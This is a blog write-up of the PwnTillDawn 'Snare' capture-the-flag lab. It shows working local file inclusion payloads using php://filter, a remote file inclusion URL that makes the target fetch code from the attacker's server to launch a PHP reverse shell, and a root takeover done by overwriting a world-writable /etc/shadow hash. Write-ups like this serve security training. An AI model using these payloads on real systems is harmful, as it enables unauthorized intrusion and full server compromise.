---
layout: post
title: PwnTillDawn - Snare Write-Up
date: 2024-06-30
classes: wide
description: Escalating privileges via writable /etc/shadow.
---

# Snare (10.150.150.18)

![](/assets/img/post/pwntilldawn_snare/1.png)



## Scanning Target

Let's start as usual with Nmap:

```
sudo nmap -sV -sC -oN nmap.txt 10.150.150.18
```

![](/assets/img/post/pwntilldawn_snare/2.png)

We have only ports 22 and 80 available, and apart from bruteforce, there's nothing interesting about SSH, to let's work on HTTP first.



## Web Server Exploration

Upon loading the website there's nothing really interesting on the page itself, but there's one thing that instantly draws attention, which is the URL.

![](/assets/img/post/pwntilldawn_snare/3.png)

I *always* recommend checking out the source-code for clues and/or interesting findings, but this time it's quite obvious, we can try changing the page name to see how the server responds, and we'll soon find out this is a LFI vulnerability. Interestingly enough, any other file apart from the web pages isn't working, still, we don't know the reason. 



## Local File Inclusion

One cool trick I've learned is that you can use PHP wrappers to retrieve file contents by converting them into base64 strings, we can try reading the page index and have a peek on the code.

```
http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

![](/assets/img/post/pwntilldawn_snare/4.png)

Yet, by some reason, even `index.php` isn't working, but when we try to do the same with home page, it works like a charm. So we know this vulnerability *do* exist.

```
http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

![](/assets/img/post/pwntilldawn_snare/5.png)

In this case, I can only assume that's the page is appending the `.php` extension, and we can type `index` without the extension. Yes, we could try bypassing it somehow and accessing the server files, yet, understanding the code internal workings is our best bet to easily exploit the server.

```
http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=index
```

![](/assets/img/post/pwntilldawn_snare/6.png)

It works! After decoding the contents of the Base64 string, we can confirm our previous theory.

```php
<?php

if (empty($_GET)) {
	header('Location: /index.php?page=home');
} 
else {
	$page = $_GET['page'];
	include ($page. '.php');
}
?>
```

This code snippet adds the `.php` extension to whatever text we add in the URL, and using `%00` doesn't work, but what we can do is try to reach external server and see if this escalates to a Remote File Inclusion vulnerability.



## Remote File Inclusion

To test this theory, what we can do is to run a local server within our machine and perform a request to any file.

```
python -m http.server
```

Back to the web page, we'll type the following URL:

```
http://10.150.150.18/index.php?page=http://10.66.66.230:8000/random
```

And back to our terminal:

![](/assets/img/post/pwntilldawn_snare/7.png)



## Uploading a Shell

Great, we can now try to use this and load a PHP reverse shell to get access. I'll be using [Pentest Monkey's PHP Shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). Remember to change the shell options to your IP address and port before using it.

![](/assets/img/post/pwntilldawn_snare/8.png)

Now we just have to start a listener using `netcat` on the same port and request the file in our machine omitting the extension and voilá!

![](/assets/img/post/pwntilldawn_snare/9.png)

The first flag is available on the `/home/snare` directory inside the machine.

![](/assets/img/post/pwntilldawn_snare/10.png)



## Privilege Escalation

Now, assuming the next one is inside `/root` folder, we must find a way to escalate our privileges. Looking for binaries, kernel and OS version, among other stuff would take too long, we can use `LINPEAS-ng` which a bash script that does this for us and list potential escalation methods.

Normally it would take just a simple command to use it, but since PwnTillDawn machines can't connect outside the VPN's network, you must download and follow the same usage describe in [this page](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS).

From the output, we can see the `/etc/shadow` file has read/write permissions to any user, which means we can easily root the machine by accessing the account hash and changing it inside the file.

```
mkpasswd -m sha-512 pwned
```

This command will generate a new hash on the attacker with whatever password you want, now back to the target, you can use `nano` to edit the file and change root's password hash by simply deleting it and pasting the newly hash.

![](/assets/img/post/pwntilldawn_snare/11.png)

Notice only the hash should be replaced, the others values separated by `:` must stay the same.

Once done, just use the `su` command to access root account, and type the password you've just created, which in my case was `pwned`.

![](/assets/img/post/pwntilldawn_snare/12.png)

Finally, the final flag is available inside `/root` by the name of `FLAG2.txt`.
